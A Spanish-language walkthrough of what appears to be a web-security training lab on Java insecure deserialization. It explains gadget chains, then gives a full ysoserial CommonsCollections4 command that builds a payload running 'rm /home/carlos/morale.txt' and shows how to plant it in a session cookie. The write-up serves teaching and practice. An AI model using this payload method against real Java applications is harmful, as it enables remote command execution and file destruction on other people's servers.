# 🧬 Deserialización Java con Apache Commons

## 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización Java nativa para gestionar la sesión del usuario**.\
El backend deserializa directamente datos controlados por el cliente utilizando `ObjectInputStream`.

La aplicación incluye la librería **Apache Commons Collections**, lo que permite explotar el proceso de deserialización mediante una **cadena de gadgets** que termina ejecutando comandos del sistema operativo.

🎯 **Objetivo del laboratorio:**

* Ejecutar un comando en el servidor
* Eliminar el archivo:

```
/home/carlos/morale.txt
```

Credenciales iniciales:

```
wiener : peter
```



## 📚 Teoría

Este laboratorio representa el caso más peligroso de **Insecure Deserialization en Java**.

### 📌 Flujo vulnerable

Muchas aplicaciones Java manejan objetos serializados de la siguiente forma:

```
1. El servidor recibe datos serializados controlados por el cliente
2. Los datos se decodifican (normalmente Base64)
3. Se pasan directamente a ObjectInputStream.readObject()
```

Ejemplo típico:

```
new ObjectInputStream(inputStream).readObject();
```

Si el objeto deserializado pertenece a una clase peligrosa, pueden ejecutarse métodos automáticamente durante el proceso.

### 📌 Gadgets y POP chains

Cuando el **classpath contiene bibliotecas vulnerables**, como Apache Commons Collections, el atacante puede crear una **POP chain (Property-Oriented Programming)**.

Apache Commons Collections contiene clases que permiten encadenar llamadas a métodos:

```
Transformer
InvokerTransformer
ChainedTransformer
```

Estas clases pueden usarse para invocar:

```
Runtime.getRuntime().exec()
```

Esto permite ejecutar comandos del sistema operativo durante la deserialización.

### 📌 Uso de ysoserial

Como no tenemos acceso al código fuente, utilizamos **ysoserial**, una herramienta que genera objetos Java serializados maliciosos.

ysoserial incluye implementaciones de múltiples cadenas de gadgets para distintas librerías.

En este laboratorio se utiliza:

```
CommonsCollections4
```



## 📝 Práctica

### 1️⃣ Iniciar sesión y localizar la cookie vulnerable

Iniciamos sesión con:

```
wiener : peter
```

Interceptamos una petición autenticada con **Burp Suite**.

Observamos una cookie de sesión con un valor largo codificado en Base64:

```
session=...
```

Este valor es el objeto serializado que el servidor deserializa.



### 2️⃣ Preparar la herramienta ysoserial

Descargamos **ysoserial** desde GitHub:

```
ysoserial-all.jar
```

Podemos ver los payloads disponibles con:

```
java -jar ysoserial-all.jar
```

Para este laboratorio utilizaremos:

```
CommonsCollections4
```



### 3️⃣ Generar el payload malicioso

Creamos un objeto serializado que ejecute el comando:

```
rm /home/carlos/morale.txt
```

Comando para generar el payload:

```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-jar ysoserial-all.jar \
CommonsCollections4 'rm /home/carlos/morale.txt' \
| base64 -w0
```

Esto genera:

* Un objeto Java serializado malicioso
* Codificado en Base64
* Sin saltos de línea

### 4️⃣ Preparar la cookie

Las cookies no aceptan correctamente caracteres como:

```
=
+
/
```

Por ello debemos aplicar **URL encoding** al payload Base64.

En **Burp Decoder**:

```
1. Pegamos el payload Base64
2. Aplicamos URL Encode
```

El resultado tendrá un formato similar a:

```
rO0ABXNyABFqYXZh...%3D%3D
```



### 5️⃣ Enviar el payload al servidor

Interceptamos cualquier petición en **Burp Suite**.

Reemplazamos el valor de la cookie de sesión por el payload generado.

Ejemplo:

```
Cookie: session=<payload_url_encoded>
```

Enviamos la petición.



### 6️⃣ Ejecución en el servidor

En el backend ocurre lo siguiente:

```
1. El servidor lee la cookie
2. Decodifica el valor Base64
3. Ejecuta ObjectInputStream.readObject()
4. Se deserializa el objeto CommonsCollections4
5. La cadena de gadgets se ejecuta
```

Finalmente se ejecuta:

```
Runtime.getRuntime().exec("rm /home/carlos/morale.txt")
```

El archivo objetivo es eliminado.
